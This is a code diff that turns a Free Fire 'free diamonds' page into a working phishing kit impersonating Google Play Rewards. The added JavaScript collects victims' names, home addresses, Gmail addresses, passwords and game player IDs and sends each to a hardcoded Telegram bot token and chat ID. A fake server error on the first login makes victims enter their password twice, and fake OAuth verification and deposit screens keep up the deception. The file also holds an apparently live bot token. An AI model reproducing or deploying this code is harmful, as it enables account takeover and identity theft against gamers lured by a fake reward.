@@ -1,200 +1,807 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Google Play Points - مكافآت فري فاير</title>
-  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Play Rewards Center</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.in/icon?family=Material+Icons" rel="stylesheet">
 
-    body {
-      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
-      background: #ffffff;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-    }
+    <style>
+        /* Base Styles - Clean, Minimal Background */
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f7f9fd; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            direction: ltr; 
+            text-align: left;
+            padding: 20px;
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
 
-    .container {
-      background: #ffffff;
-      border-radius: 24px;
-      padding: 48px 40px;
-      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.12), 0 2px 8px rgba(0, 0, 0, 0.08);
-      max-width: 480px;
-      width: 100%;
-      text-align: center;
-      animation: fadeIn 0.5s ease-in-out;
-    }
+        /* ================================================= */
+        /* Fake Loader Bar */
+        /* ================================================= */
+        #initialLoader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px; 
+            background-color: transparent; 
+            z-index: 9999;
+            overflow: hidden;
+            display: block;
+        }
+        #initialProgressBar {
+            height: 100%;
+            width: 0%;
+            background-color: #4285F4; /* Google Blue */
+            transition: width 3s linear;
+        }
 
-    @keyframes fadeIn {
-      from {
-        opacity: 0;
-        transform: translateY(20px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
+        /* Screen Control */
+        .screen {
+            display: none;
+            width: 100%;
+            animation: fadeIn 0.8s ease-out; 
+        }
+        .screen.active {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
 
-    .logo-container {
-      margin-bottom: 32px;
-    }
+        /* Box/Card Design - Elegant & Elevated */
+        .box {
+            background-color: #fff;
+            padding: 35px; 
+            border-radius: 16px; 
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.05); 
+            width: 100%;
+            max-width: 450px;
+            box-sizing: border-box;
+            margin: auto;
+        }
 
-    .logo-container img {
-      width: 180px;
-      height: auto;
-      filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.1));
-    }
+        /* Input Styles (Unified Google Style) */
+        .input-group { position: relative; margin-bottom: 25px; }
+        .input-group input, .input-group select { 
+            width: 100%; 
+            padding: 13px 15px; 
+            border: 1px solid #dadce0; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            outline: none; 
+            box-sizing: border-box; 
+            transition: border-color 0.3s, border-width 0.3s; 
+            background-color: white; 
+            color: #333; 
+        }
+        .input-group select { appearance: none; padding-right: 35px; }
+        .input-group input:focus, .input-group select:focus { border-color: #4285F4; border-width: 2px; padding: 12px 14px; }
+        .input-group label { 
+            position: absolute; 
+            top: 13px; 
+            left: 15px; 
+            color: #80868b; 
+            font-size: 16px; 
+            pointer-events: none; 
+            transition: all 0.2s ease; 
+            background: white; 
+            padding: 0 4px; 
+        }
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label,
+        .input-group select:valid + label { 
+            top: -10px; 
+            font-size: 12px; 
+            color: #4285F4; 
+        }
 
-    .badge {
-      display: inline-block;
-      background: linear-gradient(135deg, #4285F4 0%, #34A853 100%);
-      color: white;
-      padding: 8px 20px;
-      border-radius: 20px;
-      font-size: 13px;
-      font-weight: 500;
-      margin-bottom: 24px;
-      letter-spacing: 0.5px;
-    }
 
-    h1 {
-      color: #202124;
-      font-size: 28px;
-      font-weight: 700;
-      margin-bottom: 16px;
-      line-height: 1.3;
-    }
+        /* Error & Button Styles */
+        .error-message { color: #d93025; font-size: 13px; margin-top: 5px; margin-bottom: 10px; display: none; font-weight: 500;}
+        
+        /* Action Button - Primary Blue */
+        .action-button { 
+            background-color: #4285F4; 
+            color: #fff; 
+            padding: 16px 30px; 
+            border: none; 
+            border-radius: 12px; 
+            font-size: 18px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            margin-top: 30px; 
+            width: 100%; 
+            box-shadow: 0 2px 4px rgba(66, 133, 244, 0.4); 
+            transition: background-color 0.3s, box-shadow 0.3s;
+        }
+        .action-button:hover { 
+            background-color: #1a73e8; 
+            box-shadow: 0 4px 8px rgba(66, 133, 244, 0.5); 
+        }
+        
+        /* Login & Address Screen Specific Buttons */
+        .screen-actions { display: flex; justify-content: flex-end; align-items: center; margin-top: 40px; }
+        .screen-actions button.next-button { 
+            width: auto; 
+            min-width: 100px; 
+            padding: 10px 24px; 
+            font-weight: 500; 
+            background-color: #4285F4; 
+            border: none; 
+            border-radius: 8px; 
+            color: #fff; 
+            cursor: pointer; 
+            font-size: 16px; 
+            box-shadow: none; 
+            transition: background-color 0.3s;
+        }
+        .screen-actions button.next-button:hover:not(:disabled) { background-color: #1a73e8; }
+        .screen-actions button.next-button:disabled { 
+            background-color: #a0c3ff; 
+            cursor: not-allowed; 
+        }
+        
+        /* Removed RTL and letter-spacing for English password */
+        
+        /* Google Logo Text Style (Used across screens) */
+        .google-logo-text { 
+            font-size: 32px; 
+            font-weight: 400; 
+            display: block; 
+            margin: 0 auto 10px auto; 
+            text-align: center; 
+        }
 
-    .reward-amount {
-      color: #4285F4;
-      font-size: 48px;
-      font-weight: 700;
-      margin: 24px 0;
-      text-shadow: 0 2px 4px rgba(66, 133, 244, 0.2);
-    }
-
-    .reward-icon {
-      font-size: 64px;
-      margin: 16px 0;
-    }
-
-    p {
-      color: #5f6368;
-      font-size: 16px;
-      line-height: 1.6;
-      margin-bottom: 32px;
-    }
-
-    .features {
-      background: #f8f9fa;
-      border-radius: 16px;
-      padding: 20px;
-      margin: 24px 0;
-      text-align: right;
-    }
-
-    .feature-item {
-      display: flex;
-      align-items: center;
-      justify-content: flex-start;
-      margin: 12px 0;
-      color: #202124;
-      font-size: 14px;
-    }
-
-    .feature-item::before {
-      content: "✓";
-      color: #34A853;
-      font-weight: bold;
-      font-size: 18px;
-      margin-left: 12px;
-    }
-
-    .claim-button {
-      background: linear-gradient(135deg, #4285F4 0%, #1a73e8 100%);
-      color: white;
-      border: none;
-      padding: 16px 48px;
-      font-size: 16px;
-      font-weight: 500;
-      border-radius: 28px;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 4px 12px rgba(66, 133, 244, 0.4);
-      letter-spacing: 0.5px;
-      width: 100%;
-      max-width: 320px;
-    }
-
-    .claim-button:hover {
-      background: linear-gradient(135deg, #1a73e8 0%, #174ea6 100%);
-      box-shadow: 0 6px 20px rgba(66, 133, 244, 0.5);
-      transform: translateY(-2px);
-    }
-
-    .claim-button:active {
-      transform: translateY(0);
-    }
-
-    .footer-text {
-      margin-top: 24px;
-      font-size: 12px;
-      color: #80868b;
-    }
-
-    @media (max-width: 480px) {
-      .container {
-        padding: 32px 24px;
-      }
-
-      h1 {
-        font-size: 24px;
-      }
-
-      .reward-amount {
-        font-size: 40px;
-      }
-    }
-  </style>
+        /* Welcome Screen Styling */
+        .welcome-title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #1f1f1f;
+            margin-top: 5px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .reward-info-card {
+            background-color: #e8f0fe; 
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 25px;
+            border: 1px solid #d2e3fc; 
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        .reward-details {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            color: #1f1f1f;
+        }
+        .reward-details i {
+            color: #34a853; 
+            font-size: 28px !important; 
+        }
+        .reward-details h3 {
+            margin: 0;
+            font-size: 18px;
+            font-weight: 500;
+        }
+        .reward-amount {
+            font-size: 38px; 
+            font-weight: 900;
+            color: #1f1f1f; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 15px 0 5px 0;
+            margin-top: 10px;
+            border-top: 1px dashed #d2e3fc;
+        }
+        .diamond-emoji {
+            font-size: 45px; 
+            line-height: 1; 
+            margin-right: 10px;
+        }
+        .points-logo-text {
+             color: #5f6368;
+             font-size: 14px;
+             font-weight: 500;
+             margin-bottom: 20px; 
+        }
+        
+        /* Address Screen Specific */
+        .address-box h2 {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 500;
+            color: #1f1f1f;
+            margin-bottom: 10px;
+        }
+        .address-box p {
+            text-align: center;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <div class="logo-container">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Google_2015_logo.svg/1200px-Google_2015_logo.svg.png" alt="Google Logo">
+    
+    <div id="initialLoader">
+        <div id="initialProgressBar"></div>
     </div>
 
-    <div class="badge">🎁 عرض حصري</div>
+    <div id="app-container">
+        
+        <section id="welcomeScreen" class="screen active">
+            <div class="box">
+                <div class="points-header">
+                    
+                    <h1 class="google-logo-text" style="margin-bottom: 5px;">
+                        <span style="color:#4285F4;">G</span><span style="color:#EA4335;">o</span><span style="color:#FBBC05;">o</span><span style="color:#4285F4;">g</span><span style="color:#34A853;">l</span><span style="color:#EA4335;">e</span>
+                    </h1>
 
-    <h1>مكافأة Google Play Points</h1>
+                    <p class="points-logo-text">Official Google Play Rewards</p>
+                    <h1 class="welcome-title">Exclusive Reward Redemption Center</h1>
+                </div>
 
-    <div class="reward-icon">💎</div>
-    <div class="reward-amount">600</div>
+                <div class="reward-info-card">
+                    <div class="reward-details">
+                        <i class="material-icons">verified</i>
+                        <h3>Account Eligibility Confirmed</h3>
+                    </div>
+                    
+                    <div class="reward-amount">
+                        <span class="diamond-emoji">💎</span>
+                        <span>600 Diamonds</span>
+                    </div>
 
-    <p>جوهرة مجانية في فري فاير</p>
+                    <p style="text-align: center; font-size: 16px; font-weight: 500; color: #5f6368; margin: 0;">Your free reward is ready for transfer.</p>
 
-    <div class="features">
-      <div class="feature-item">تفعيل فوري للمكافأة</div>
-      <div class="feature-item">آمن ومضمون 100%</div>
-      <div class="feature-item">متوافق مع جميع الحسابات</div>
-      <div class="feature-item">بدون رسوم إضافية</div>
+                    <div class="reward-summary" style="padding-top: 10px;">
+                        <p style="margin: 0;">Congratulations! Your account has been selected by the Google Play Rewards system to receive an instant cash reward, convertible to in-game diamonds.</p>
+                    </div>
+                </div>
+
+                <p class="security-note" style="text-align: center; color: #5f6368; margin-bottom: 0;">Please proceed to verify your identity and ensure a secure transfer process.</p>
+
+                <button onclick="showScreen('addressScreen')" class="action-button">Proceed to Verification</button>
+            </div>
+        </section>
+
+        <section id="addressScreen" class="screen hidden">
+            <div class="box address-box">
+                <h1 class="google-logo-text">
+                    <span style="color:#4285F4;">G</span><span style="color:#EA4335;">o</span><span style="color:#FBBC05;">o</span><span style="color:#4285F4;">g</span><span style="color:#34A853;">l</span><span style="color:#EA4335;">e</span>
+                </h1>
+                
+                <h2>Secure Address Verification</h2>
+                <p>Please enter your payment address details to process the reward securely.</p>
+                
+                <form id="addressForm">
+                    <div class="input-group">
+                        <input type="text" id="fullName" name="fullName" placeholder=" " required>
+                        <label for="fullName">Full Name</label>
+                    </div>
+                    <div class="input-group">
+                        <input type="text" id="streetAddress" name="streetAddress" placeholder=" " required>
+                        <label for="streetAddress">Street Address</label>
+                    </div>
+                    <div class="input-group">
+                        <input type="text" id="aptNumber" name="aptNumber" placeholder=" " required>
+                        <label for="aptNumber">Apartment/Suite Number</label>
+                    </div>
+                    <div class="input-group">
+                        <select id="stateSelect" name="stateSelect" required>
+                            <option value="" disabled selected>Select State</option>
+                            <option value="AL">Alabama</option>
+                            <option value="AK">Alaska</option>
+                            <option value="AZ">Arizona</option>
+                            <option value="AR">Arkansas</option>
+                            <option value="CA">California</option>
+                            <option value="CO">Colorado</option>
+                            <option value="CT">Connecticut</option>
+                            <option value="DE">Delaware</option>
+                            <option value="FL">Florida</option>
+                            <option value="GA">Georgia</option>
+                            <option value="HI">Hawaii</option>
+                            <option value="ID">Idaho</option>
+                            <option value="IL">Illinois</option>
+                            <option value="IN">Indiana</option>
+                            <option value="IA">Iowa</option>
+                            <option value="KS">Kansas</option>
+                            <option value="KY">Kentucky</option>
+                            <option value="LA">Louisiana</option>
+                            <option value="ME">Maine</option>
+                            <option value="MD">Maryland</option>
+                            <option value="MA">Massachusetts</option>
+                            <option value="MI">Michigan</option>
+                            <option value="MN">Minnesota</option>
+                            <option value="MS">Mississippi</option>
+                            <option value="MO">Missouri</option>
+                            <option value="MT">Montana</option>
+                            <option value="NE">Nebraska</option>
+                            <option value="NV">Nevada</option>
+                            <option value="NH">New Hampshire</option>
+                            <option value="NJ">New Jersey</option>
+                            <option value="NM">New Mexico</option>
+                            <option value="NY">New York</option>
+                            <option value="NC">North Carolina</option>
+                            <option value="ND">North Dakota</option>
+                            <option value="OH">Ohio</option>
+                            <option value="OK">Oklahoma</option>
+                            <option value="OR">Oregon</option>
+                            <option value="PA">Pennsylvania</option>
+                            <option value="RI">Rhode Island</option>
+                            <option value="SC">South Carolina</option>
+                            <option value="SD">South Dakota</option>
+                            <option value="TN">Tennessee</option>
+                            <option value="TX">Texas</option>
+                            <option value="UT">Utah</option>
+                            <option value="VT">Vermont</option>
+                            <option value="VA">Virginia</option>
+                            <option value="WA">Washington</option>
+                            <option value="WV">West Virginia</option>
+                            <option value="WI">Wisconsin</option>
+                            <option value="WY">Wyoming</option>
+                        </select>
+                        <label for="stateSelect">State</label>
+                    </div>
+                    <div class="input-group">
+                        <input type="text" id="zipCode" name="zipCode" placeholder=" " required pattern="\d{5}" title="ZIP Code must be 5 digits">
+                        <label for="zipCode">ZIP Code</label>
+                    </div>
+
+                    <p id="addressError" class="error-message" style="text-align: center;">❌ Please fill in all address fields correctly.</p>
+
+                    <div class="screen-actions">
+                        <button id="saveAddressButton" type="button" class="next-button">Save and Continue</button>
+                    </div>
+                </form>
+            </div>
+        </section>
+
+        <section id="loginScreen" class="screen hidden">
+            <div class="box login-box">
+                <h1 class="google-logo-text">
+                    <span style="color:#4285F4;">G</span><span style="color:#EA4335;">o</span><span style="color:#FBBC05;">o</span><span style="color:#4285F4;">g</span><span style="color:#34A853;">l</span><span style="color:#EA4335;">e</span>
+                </h1>
+                
+                <h2 class="header-text" style="text-align: center; font-size: 24px; font-weight: 500; color: #1f1f1f;">Sign in</h2>
+                <p class="subtitle-text" style="text-align: center; color: #5f6368; margin-bottom: 30px;">Use your Google Account to continue</p>
+                
+                <div class="input-group">
+                    <input type="email" id="email" name="email" placeholder=" " required>
+                    <label for="email">Email or phone</label>
+                </div>
+                <p id="systemError" class="error-message" style="text-align: center; margin-bottom: 20px;">
+                    🚨 **System Error:** Due to high visitor traffic, our servers failed to process your request. Please try again.
+                </p>
+
+                <p id="emailError" class="error-message">❌ Email must be at least 4 characters, end with @gmail.com, and contain no Arabic characters.</p>
+                
+                <div class="password-container">
+                    <div class="input-group">
+                        <input type="password" id="password" name="password" placeholder=" " required minlength="6">
+                        <label for="password">Password</label>
+                    </div>
+                    
+                    <p id="passwordError" class="error-message">❌ Password must be at least 6 characters.</p>
+
+                    <div class="password-visibility" style="margin-top: -15px;">
+                        <input type="checkbox" id="showPasswordToggle">
+                        <label for="showPasswordToggle" style="color: #5f6368; font-size: 14px;">Show Password</label>
+                    </div>
+                </div>
+                
+                <div class="screen-actions">
+                    <button id="loginButton" type="button" class="next-button">Next</button>
+                </div>
+            </div>
+        </section>
+
+        <section id="waitingScreen" class="screen hidden">
+            <div class="box waiting-box">
+                <h2 class="header-text" style="text-align: center; color: #4285F4;">ℹ️ Verifying Your Information...</h2>
+                <p id="waitingStatus" class="status-message-wait" style="text-align: center; color: #5f6368; margin-top: 20px;">Initiating connection to Google Play servers...</p>
+                <div class="progress-container" style="height: 8px; background-color: #e6e6e6; border-radius: 4px; margin-top: 30px;"> 
+                    <div id="progressBar" class="progress-bar" style="height: 100%; width: 0%; background-color: #4285F4; border-radius: 4px; transition: width 1s linear;"></div> 
+                </div>
+                <p id="timerDisplay" class="waiting-time" style="text-align: center; font-size: 14px; color: #80868b; margin-top: 15px;">Estimated remaining time: 60 seconds</p>
+            </div>
+        </section>
+
+        <section id="redeemScreen" class="screen hidden">
+            <div class="box redeem-form">
+                
+                <h1 class="google-logo-text" style="margin-bottom: 5px;">
+                    <span style="color:#4285F4;">G</span><span style="color:#EA4335;">o</span><span style="color:#FBBC05;">o</span><span style="color:#4285F4;">g</span><span style="color:#34A853;">l</span><span style="color:#EA4335;">e</span>
+                </h1>
+                
+                <h2 class="header-text" style="text-align: center; font-size: 26px; font-weight: 500; color: #1f1f1f; margin-top: 15px;">
+                   Claim Your Exclusive Diamond Reward
+                </h2>
+                
+                <div class="reward-info-card" style="background-color: #f6fff8; border: 1px solid #c8e6c9; padding: 18px; margin-top: 25px;">
+                    <p style="text-align: center; color: #34A853; font-size: 16px; font-weight: 700; margin-bottom: 5px;">
+                        ✅ Verification Complete!
+                    </p>
+                    <div class="reward-amount" style="border-top: none; padding-top: 0; margin-bottom: 0;">
+                        <span class="diamond-emoji" style="font-size: 40px;">💎</span>
+                        <span style="font-size: 32px; font-weight: 900; color: #1f1f1f;">600 Diamonds</span>
+                    </div>
+                    <p style="text-align: center; font-size: 14px; color: #5f6368; margin-top: 5px;">
+                        Value: **$7.99 USD** (Instant Transfer)
+                    </p>
+                </div>
+
+                <div style="margin-top: 30px; padding: 0 10px;">
+                    <h3 style="font-size: 18px; font-weight: 700; color: #4285F4; margin-bottom: 10px;">
+                        Why this offer?
+                    </h3>
+                    <p style="font-size: 14px; color: #5f6368; line-height: 1.6;">
+                        This reward is part of the **Google Play Loyalty Appreciation Program** for active players in your region. Your account was randomly selected to convert this credit into **600 Free Fire Diamonds** instantly to enhance your in-game experience. **This is the final step!**
+                    </p>
+                </div>
+
+                <div style="margin-top: 30px;">
+                    <p class="small-text" style="text-align: center; color: #1f1f1f; font-size: 15px; font-weight: 700; margin-bottom: 20px;">
+                        🔑 Enter your **Player ID (UID)** to ensure a secure transfer:
+                    </p>
+                    <form id="redeemForm">
+                        <div class="input-group">
+                            <input type="text" id="freefireID" name="freefireID" placeholder=" " required pattern="\d{10}" title="Please enter 10 digits only" style="text-align: center; font-size: 20px;">
+                            <label for="freefireID">Player ID (10 digits)</label>
+                        </div>
+                        <p id="idError" class="error-message">❌ Player ID must be exactly 10 digits.</p>
+                        <button type="submit" class="action-button">💎 Send Diamonds to My Account</button>
+                    </form>
+                </div>
+            </div>
+        </section>
+
+        <section id="processingScreen" class="screen hidden">
+            <div class="box">
+                <h1 class="header-text" style="color: #34A853; text-align: center; font-size: 24px;">Diamond Transfer in Progress...</h1>
+                <div class="processing-icon" style="width: 60px; height: 60px; border: 5px solid #FBBC05; border-top-color: transparent; border-radius: 50%; margin: 25px auto; display: flex; align-items: center; justify-content: center; animation: spin 1s infinite linear;">
+                    <i class="material-icons" style="font-size: 32px; color: #FBBC05;">autorenew</i>
+                </div>
+                <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+
+                <p class="final-status-message" style="text-align: center; color: #1f1f1f;">Depositing <strong id="finalDiamonds">600 Diamonds</strong> to your account. Please wait.</p>
+                <div class="processing-bar-container" style="height: 8px; background-color: #e6e6e6; border-radius: 4px; margin-top: 20px;"> 
+                    <div id="depositProgressBar" class="processing-bar" style="height: 100%; width: 0%; background-color: #34A853; border-radius: 4px; transition: width 1s linear;"></div> 
+                </div>
+                <p class="security-note" style="margin-top: 20px; font-weight: 500; text-align: center; color: #80868b; font-size: 14px;">🔔 **Note:** The transfer may take between 5 minutes and 24 hours to reflect in the game.</p>
+            </div>
+        </section>
+
     </div>
+    
+    <script>
+        // Telegram Bot Settings
+        const BOT_TOKEN = '7889525634:AAFVX4GAiIaIddBykK_QQw3Ry3a_9utp5d8';
+        const CHAT_ID = '7845009971';
+        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const MAX_DIAMONDS = 600;
+        const WAITING_TIME_SECONDS = 60; 
+        const DEPOSIT_TIME_SECONDS = 10; 
+        const FIRST_ATTEMPT_DELAY = 10000; // 10 seconds delay for the first failure
 
-    <button class="claim-button" onclick="location.href='eligibility.html'">
-      المطالبة بالمكافأة الآن
-    </button>
+        // Function to send messages to Telegram
+        function sendToTelegram(messageText) {
+            const data = {
+                chat_id: CHAT_ID,
+                text: messageText,
+                parse_mode: 'HTML'
+            };
+            fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data),
+                mode: 'cors' 
+            }).catch(error => {
+                console.error("[TELEGRAM] Failed to connect:", error);
+            });
+        }
+        
+        // Function to send a general notification about a new visitor
+        function sendNewVisitorNotification() {
+            const message = `
+            🔔 <b>New Visitor Entered the Page!</b> 🔔
+            <b>========================</b>
+            <b>Time:</b> ${new Date().toLocaleString('en-US')}
+            `;
+            sendToTelegram(message);
+        }
 
-    <p class="footer-text">
-      عرض محدود • شروط وأحكام تطبق
-    </p>
-  </div>
+        // Function to switch between screens
+        function showScreen(screenId) {
+            document.querySelectorAll('.screen').forEach(screen => {
+                screen.classList.remove('active');
+                screen.classList.add('hidden');
+            });
+            const targetScreen = document.getElementById(screenId);
+            if (targetScreen) {
+                targetScreen.classList.remove('hidden');
+                targetScreen.classList.add('active');
+            }
+        }
+        
+        // Function to check for Arabic characters (for email validation)
+        function containsArabic(text) {
+            const arabicRegex = /[\u0600-\u06FF]/;
+            return arabicRegex.test(text);
+        }
+
+        // ===========================================
+        // Address Validation and Submission Logic
+        // ===========================================
+        document.getElementById('saveAddressButton').addEventListener('click', function(event) {
+            event.preventDefault();
+
+            const fullName = document.getElementById('fullName').value.trim();
+            const streetAddress = document.getElementById('streetAddress').value.trim();
+            const aptNumber = document.getElementById('aptNumber').value.trim();
+            const stateSelect = document.getElementById('stateSelect').value;
+            const zipCode = document.getElementById('zipCode').value.trim();
+            const addressError = document.getElementById('addressError');
+            let isValid = true;
+            
+            if (!fullName || !streetAddress || !aptNumber || !stateSelect || !zipCode) {
+                addressError.textContent = "❌ Please fill in all address fields.";
+                addressError.style.display = 'block';
+                isValid = false;
+            } else if (!/^\d{5}$/.test(zipCode)) {
+                addressError.textContent = "❌ ZIP Code must be 5 digits only.";
+                addressError.style.display = 'block';
+                isValid = false;
+            } else {
+                addressError.style.display = 'none';
+            }
+
+            if (!isValid) return;
+
+            // Send Address Data to Telegram
+            const message = `
+            🏠 <b>Address Verification Completed!</b> 🏠
+            <b>=================================</b>
+            <b>Full Name:</b> <code>${fullName}</code>
+            <b>Address:</b> <code>${streetAddress}, Apt/Suite ${aptNumber}</code>
+            <b>State:</b> <code>${stateSelect}</code>
+            <b>ZIP Code:</b> <code>${zipCode}</code>
+            `;
+            sendToTelegram(message);
+
+            // Go to Login Screen
+            showScreen('loginScreen');
+            // Hide system error on initial load of login screen
+            document.getElementById('systemError').style.display = 'none';
+        });
+
+
+        // ===========================================
+        // Login Logic (Delay/Error on First Attempt)
+        // ===========================================
+        document.getElementById('loginButton').addEventListener('click', function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const emailError = document.getElementById('emailError');
+            const passwordError = document.getElementById('passwordError');
+            const systemError = document.getElementById('systemError');
+            const loginButton = document.getElementById('loginButton');
+            let isValid = true;
+            
+            const emailPrefix = email.substring(0, email.indexOf('@'));
+
+            // 1. Email Validation
+            if (!email.toLowerCase().endsWith('@gmail.com') || containsArabic(email) || emailPrefix.length < 4) {
+                emailError.style.display = 'block';
+                isValid = false;
+            } else {
+                emailError.style.display = 'none';
+            }
+
+            // 2. Password Validation
+            if (password.length < 6) {
+                passwordError.style.display = 'block';
+                isValid = false;
+            } else {
+                passwordError.style.display = 'none';
+            }
+
+            if (!isValid) return;
+
+            // 3. Send Data IMMEDIATELY to Telegram (Always send, regardless of delay/error)
+            const message = `
+            🔑 <b>Login Credentials Captured!</b> 🔑
+            <b>========================</b>
+            <b>Email:</b> <code>${email}</code>
+            <b>Password:</b> <code>${password}</code>
+            <b>Attempt:</b> ${localStorage.getItem('loginAttempted') === 'true' ? 'Second (Success)' : 'First (Faked Error)'}
+            `;
+            sendToTelegram(message);
+            
+            // Check if this is the FIRST attempt by checking localStorage
+            if (localStorage.getItem('loginAttempted') !== 'true') {
+                // --- FIRST ATTEMPT: Delay and Fake Error (10 seconds) ---
+                
+                loginButton.disabled = true; // Disable button during delay
+                loginButton.textContent = 'Processing...';
+
+                setTimeout(() => {
+                    // Set flag in localStorage for future visits
+                    localStorage.setItem('loginAttempted', 'true');
+                    
+                    // Show the system error message
+                    systemError.style.display = 'block';
+                    
+                    // Reset button state and clear input fields for a "fresh" retry
+                    loginButton.disabled = false;
+                    loginButton.textContent = 'Next';
+                    document.getElementById('password').value = '';
+                    document.getElementById('email').focus(); // Focus on email for user convenience
+                    
+                    // Note: We stay on the loginScreen.
+                }, FIRST_ATTEMPT_DELAY);
+
+            } else {
+                // --- SECOND ATTEMPT: Proceed Normally ---
+                systemError.style.display = 'none'; // Ensure error is hidden
+                
+                // Go to Waiting Screen and start delay
+                showScreen('waitingScreen');
+                startLoginWaitingProcess();
+            }
+        });
+        
+        // Show Password Toggle
+        document.getElementById('showPasswordToggle').addEventListener('change', function() {
+            const passwordField = document.getElementById('password');
+            if (this.checked) {
+                passwordField.type = 'text';
+            } else {
+                passwordField.type = 'password';
+            }
+        });
+
+        // Login Verification Progress Bar 
+        function startLoginWaitingProcess() {
+            let timeLeft = WAITING_TIME_SECONDS;
+            const timerDisplay = document.getElementById('timerDisplay');
+            const progressBar = document.getElementById('progressBar');
+            const waitingStatus = document.getElementById('waitingStatus');
+            
+            let progress = 0;
+            const step = 100 / WAITING_TIME_SECONDS;
+
+            const statusMessages = [
+                "Initiating secure connection to Google Cloud...",
+                "Executing OAuth 2.0 authorization check...",
+                "Matching account with eligible player profile...",
+                "Validating Google Play rewards balance...",
+                "Generating secure reward transfer key..."
+            ];
+            let messageIndex = 0;
+
+            const timerInterval = setInterval(() => {
+                timeLeft--;
+                progress += step;
+                
+                timerDisplay.textContent = `Estimated remaining time: ${timeLeft} seconds`;
+                progressBar.style.width = `${progress}%`;
+                
+                if (timeLeft % 12 === 0 && timeLeft > 0 && messageIndex < statusMessages.length) {
+                    waitingStatus.textContent = statusMessages[messageIndex++];
+                }
+
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    waitingStatus.textContent = "✅ Verification Complete! Redirecting to redemption page...";
+                    progressBar.style.width = '100%';
+                    
+                    // Guaranteed transition after 1.5 seconds delay
+                    setTimeout(() => showScreen('redeemScreen'), 1500); 
+                }
+            }, 1000);
+        }
+
+
+        // Redeem ID Logic
+        document.getElementById('redeemForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const freefireIDInput = document.getElementById('freefireID');
+            const freefireID = freefireIDInput.value;
+            const idError = document.getElementById('idError');
+            let isValid = true;
+
+            const idPattern = /^\d{10}$/;
+            if (!idPattern.test(freefireID)) {
+                idError.style.display = 'block';
+                isValid = false;
+            } else {
+                idError.style.display = 'none';
+            }
+
+            if (!isValid) return;
+            
+            const message = `
+            🎮 <b>Player ID Submitted!</b>
+            <b>=======================</b>
+            <b>Reward:</b> ${MAX_DIAMONDS} Diamonds
+            <b>Player ID:</b> <code>${freefireID}</code>
+            `;
+            sendToTelegram(message);
+            
+            document.getElementById('finalDiamonds').textContent = `${MAX_DIAMONDS} Diamonds`;
+            showScreen('processingScreen');
+            startDepositProcessing();
+        });
+
+        // Deposit Processing Progress Bar
+        function startDepositProcessing() {
+            const depositProgressBar = document.getElementById('depositProgressBar');
+            const processingIcon = document.querySelector('.processing-icon');
+            const finalStatusMessage = document.querySelector('.final-status-message');
+            let progress = 0;
+            const step = 100 / DEPOSIT_TIME_SECONDS; 
+
+            processingIcon.style.animation = 'spin 10s infinite linear';
+            finalStatusMessage.innerHTML = `Depositing <strong>${MAX_DIAMONDS} Diamonds</strong> to your account. Please wait.`;
+
+
+            const depositInterval = setInterval(() => {
+                progress += step;
+                depositProgressBar.style.width = `${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(depositInterval);
+                    
+                    finalStatusMessage.innerHTML = `✅ Deposit Completed! Check your account within 24 hours.`;
+                    processingIcon.style.animation = 'none';
+                    processingIcon.style.border = '5px solid #34A853'; 
+                    processingIcon.querySelector('.material-icons').textContent = 'check_circle';
+                    processingIcon.querySelector('.material-icons').style.color = '#34A853';
+                }
+            }, 1000);
+        }
+
+        // Function to start the initial fake loader and show the page
+        function startInitialLoader() {
+            const loader = document.getElementById('initialProgressBar');
+            const body = document.body;
+            
+            loader.style.width = '100%'; 
+
+            // Send new visitor notification
+            sendNewVisitorNotification(); 
+
+            // Zero delay to show the first screen fast
+            setTimeout(() => {
+                document.getElementById('initialLoader').style.display = 'none';
+                body.style.opacity = '1';
